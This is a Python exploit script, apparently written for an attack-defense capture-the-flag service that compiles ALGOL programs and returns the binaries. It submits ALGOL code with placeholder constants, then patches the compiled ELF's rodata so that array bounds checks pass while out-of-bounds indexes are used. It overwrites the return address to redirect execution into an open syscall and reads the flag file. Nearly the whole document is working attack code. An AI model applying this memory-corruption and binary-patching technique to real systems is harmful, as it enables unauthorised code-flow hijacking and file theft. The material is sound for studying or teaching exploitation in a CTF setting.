import utils
import re
from base64 import b64encode

# Reading and writing an array out of bounds by using constant indexes and rewriting rodata.
# This works cause the check and the actual array access will use two constants in rodata.
# expects compiler using untampered stack frame layout
# expects compiler using standard calling convention

# 'arr' in main() is the array to be read/write out of bounds.
# The values 2, 3 and 4 are replaced later in rodata.
# Expected offset from 'arr' to return address is 5.
# Setup open(rsi==filename, rdi==0==O_RDONLY) syscall:
# Use the return address to calc the address of syscall in openWOConfidential.
# Also use the return address to calc the address of the flagId/filename string.
# Then use the first 2 arguments a,b expected to be rsi,rdi.
# To set rax==2==SYS_open use the return value of main.
# To be able to read from the fd place the actual return address to $top one higher on the stack
# so openWOConfidential jumps back to $top (with missaligned stack will SEGV latter but thats ok).
# Then the ALGOL code outstring(readstring(fd)) can read the flag...
# To include the flagId in the binary just print it latter.
exploit_code = """
'BEGIN'
  'INTEGER' 'PROCEDURE' main(a,b);
    'INTEGER' a,b;
    'INTEGER' 'ARRAY' arr[5];
    'INTEGER' idx, retAddr;
  'BEGIN'
    retAddr := arr[2];

    arr[3] := retAddr + %d;
    arr[4] := retAddr;
    main := 2;
    a := retAddr + %d;
    b := 0
  'END';

  'INTEGER' fd;

  fd := main(1337,1337);
  outstring(readstring(fd));
  outchar(10);
  outstring("%s");
'END'
"""

# mustn't be larger 2 ** 63 - 1
pattern1 = 0x3F3F3F3F3F3F3F3F
pattern2 = 0x6F6F6F6F6F6F6F6F

def main(host, flag_id):
    # compile code with patterns for the offset constants
    code = exploit_code % (pattern1, pattern2, flag_id)
    json, elf = utils.compileCode(host, code)

    # get value of return address in main
    mainRet_off = utils.getOffsetForReturnFromFirstCall(elf, "$top")
    print("mainRet_off", hex(mainRet_off))

    # find the syscall instr in openWOConfidential
    syscall_off = utils.findSyscallInOpenWOConfidential(elf)
    print("syscall_off", hex(syscall_off))

    # find flagId in strings
    flagId_off = utils.findInStrings(elf, flag_id.encode())
    print("flagId_off", hex(flagId_off))

    # patch offsets in rodata
    assert utils.PATCH_RODATA_OR_RECOMPILE
    json = utils.replacePatternWith(host, json, elf, code, replacements=[
        # pattern1 is the offset from retAddr to syscall
        (pattern1, syscall_off - mainRet_off),
        # pattern2 is the offset from retAddr to flagId
        (pattern2, flagId_off - mainRet_off)
    ])
    
    # patch array index constants in rodata
    code = elf.disasm(elf.symbols["main"], 200)
    # find movs which load array index after index check
    match = re.findall(r"mov    rax, QWORD PTR \[rip\+0x([0-9a-f]*).*\n ([0-9a-f]*):", code)
    assert len(match) == 3
    new_indexes = {
        2: 5,
        3: 5,
        4: 6
    }
    for off1, off2 in match:
        index_constant_off = int(off1, 16) + int(off2, 16)
        index_constant = elf.u64(index_constant_off)
        new_idx = new_indexes[index_constant]
        elf.p64(index_constant_off, new_idx)

    # base64 encode patched elf
    json["binary"] = b64encode(elf.data).decode()
    # execute binary
    stdout = utils.executeAndRetStdout(host, json)
    print(stdout)


utils.launchExploit(main)
